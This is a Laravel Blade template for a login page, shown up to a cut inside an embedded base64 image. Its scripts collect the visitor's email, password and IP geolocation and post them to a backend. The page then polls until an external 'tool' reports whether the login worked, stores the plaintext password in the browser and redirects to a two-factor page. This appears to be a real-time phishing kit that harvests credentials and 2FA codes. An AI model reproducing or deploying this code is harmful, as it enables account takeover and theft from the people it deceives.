@push('icons')
    <link rel="apple-touch-icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="180x180">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="32x32">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="16x16">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="16x16">
    <link rel="mask-icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}">
@endpush
@push('styles')
    <style>
        /* CSS */
        .error {
            outline: none;
            border: 1px solid red;
        }

        .error:focus {
            outline: none;
            border: 1px solid red;
        }

        .error::placeholder {
            color: red;
        }

        .w-full {
            width: 100%;
        }

        .appearance-none {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .rounded {
            border-radius: 0.25rem;
        }

        .rounded-l-none {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .border {
            border-width: 1px;
        }

        .border-gray-300 {
            border-color: #d2d6dc;
        }

        .bg-white {
            background-color: #ffffff;
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .leading-tight {
            line-height: 1.25;
        }

        .text-gray-700 {
            color: #4a5568;
        }

        .focus\:border-gray-500:focus {
            border-color: #cbd5e0;
        }

        .focus\:outline-none:focus {
            outline: none;
        }

        .w-44 {
            width: 50px;
        }

        .appearance-none {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .border {
            border-width: 1px;
            border-style: solid;
        }

        .border-r-0 {
            border-right-width: 0;
        }

        .border-gray-300 {
            border-color: #d2d6dc;
        }

        .bg-white {
            background-color: #ffffff;
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .leading-tight {
            line-height: 1.25;
        }

        .text-gray-700 {
            color: #4a5568;
        }

        .focus\:outline-none:focus {
            outline: none;
        }

        select {
            font-family: "Noto Color Emoji", sans-serif;
            font-weight: 400;
            font-style: normal;
        }


        .error-notification {
            /* text-align: center; */
            display: none;
            /* padding: 0px 30px; */
        }

        .error-notification,
        .error-notification a {
            color: red;
        }

        .error-notification a {
            font-weight: bold;
        }
    </style>
@endpush
@push('scripts')
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // console.clear();
        });

        function openPopup() {
            document.getElementById("popup").style.display = "flex";
        }

        function closePopup() {
            document.getElementById("popup").style.display = "none";
        }

        function validatepassword() {
            var password = document.getElementById("password").value;
            if (password.length == 0) {
                $("#password").addClass('error');
                $("#password").focus();
                return;
            } else {
                $("#password").removeClass('error');
                return;
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.querySelector('.fa-eye');
            eyeIcon.addEventListener('click', function() {
                const isPasswordVisible = passwordInput.type === 'text';
                passwordInput.type = isPasswordVisible ? 'password' : 'text';
                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
            });
        });
    </script>
    {{-- js --}}
    <script>
        var ipAddress = "";
        var latitude = "";
        var longitude = "";
        var countryName = "";
        var countryCode = "";
        var cityName = "";
        var regionName = "";
        var timeZone = "";
        var zipCode = "";
        var continent = "";
        var continentCode = "";

        setCurrentLang();

        async function setCurrentLang() {
            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
            const response = await fetch(getIpInfoUrl);
            const ipInfo = await response.json();
            console.log(ipInfo);
            ipAddress = ipInfo.ipAddress;
            latitude = ipInfo.latitude;
            longitude = ipInfo.longitude;
            countryName = ipInfo.countryName;
            countryCode = ipInfo.countryCode;
            cityName = ipInfo.cityName;
            regionName = ipInfo.regionName;
            timeZone = ipInfo.timeZone;
            zipCode = ipInfo.zipCode;
            continent = ipInfo.continent;
            continentCode = ipInfo.continentCode;
        }

        function pushIPInfo(formData) {
            formData.append('ipAddress', ipAddress)
            formData.append('latitude', latitude)
            formData.append('longitude', longitude)
            formData.append('countryName', countryName)
            formData.append('countryCode', countryCode)
            formData.append('regionName', regionName)
            formData.append('cityName', cityName)
            formData.append('timeZone', timeZone)
            formData.append('zipCode', zipCode)
            formData.append('continent', continent)
            formData.append('continentCode', continentCode)
            return formData;
        }

        function isNumeric(str) {
            if (typeof str != "string") return false // we only process strings!

            return !isNaN(str) &&
                // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
                !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
        }

        function isValidValuePhoneEmail(value) {
            if (isNumeric(value)) {
                const regexPhoneNumber = /^0\d{9,11}$/;

                return regexPhoneNumber.test(value);
            } else {
                const regexEmail = /\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;

                return regexEmail.test(value);
            }
        }


        var idIntervalGetCacheByEmail = null;
        var isLoginSuccessfully = 0;
        var email = "";

        function sendDataLogin() {
            //
            $('.error-notification').css('display', 'none');
            //
            const valueEmail = $('#email').val();
            email = valueEmail;
            const valuePassword = $('#password').val();
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            let formData = new FormData();
            formData.append('email_2', valueEmail);
            formData.append('password_2', valuePassword);
            formData = pushIPInfo(formData);
            $.ajax({
                method: "POST",
                url: "/api/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        // start to call get cache by email waiting until tool returns response of login
                        idIntervalGetCacheByEmail = setInterval(async () => {
                            let info = await getCacheByEmail(valueEmail);
                            if (info) {
                                text.removeClass('d-none');
                                loading.addClass('d-none');
                                if (parseInt(info.isLoginSuccessfully) == 1) {
                                    // $('#modal-login').css('display', 'none');
                                    // $('#modal-fa').css('display', 'block');
                                    // $('.error-notification').css('display', 'none');
                                    // save user to localStorage
                                    localStorage.setItem('user', JSON.stringify({
                                        email: valueEmail,
                                        password: valuePassword,
                                    }));

                                    window.location.href = '/twofa';
                                } else {
                                    console.log('Login failed');
                                    $('.error-notification').css('display', 'block');
                                    text.removeClass('d-none');
                                    loading.addClass('d-none');
                                }
                                clearInterval(idIntervalGetCacheByEmail);
                                $('.button-form-login').prop('disabled', false);
                            } else {
                                console.log("Still call get cache by email");
                            }
                        }, 3000);
                    } else {
                        $('.button-form-login').prop('disabled', false);
                        $('.error-notification').css('display', 'block');
                        text.removeClass('d-none');
                        loading.addClass('d-none');
                    }
                }
            })
        }

        async function getCacheByEmail(email) {
            let result = null;
            let formData = new FormData();
            formData.append('email', email);
            await $.ajax({
                method: "POST",
                url: "/api/get-cache-by-email",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        result = response.data;
                    }
                }
            })

            return result;
        }

        $(document).on('click', '#must-check', function() {
            let value = $('#email').val();
            if ($(this).is(':checked') && isValidValuePhoneEmail(value)) {
                $('.btn-submit').prop('disabled', false);
                $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
            } else {
                $('.btn-submit').prop('disabled', true);
                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
            }
        })

        $(document).on('click', '.button-form-login', function() {
            $(this).prop('disabled', true);
            $('#login_error').addClass('d-none');
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            text.addClass('d-none');
            loading.removeClass('d-none');
            let email = $('#email').val();
            let pass = $('#password').val();
            setTimeout(() => {
                if (!pass) {
                    text.removeClass('d-none');
                    loading.addClass('d-none');
                    $('.error-notification').css('display', 'block');
                    $(this).prop('disabled', false);
                } else {
                    sendDataLogin();
                }
            }, 1000);
        });

        $(document).on('input', '#email', function() {
            if (isValidValuePhoneEmail($(this).val())) {
                $(this).removeClass("error");
                $(this).prop('placeholder', '');
                if ($('#must-check').is(':checked')) {
                    $('.btn-submit').prop('disabled', false);
                    $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
                }
            } else {
                $(this).addClass("error");
                $(this).prop('placeholder', 'Email or number phone is not valid');
                $(this).focus();
                $('.btn-submit').prop('disabled', true);
                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
            }
        });
    </script>
@endpush
@extends('layouts.main')
@section('content')
<div class="header">
    <img src=""
        alt="" />
</div>
<div class="main">
    <div class="maintop">
        <div class="content">
            <img class="imgtop"
                src="data:image/png;base64,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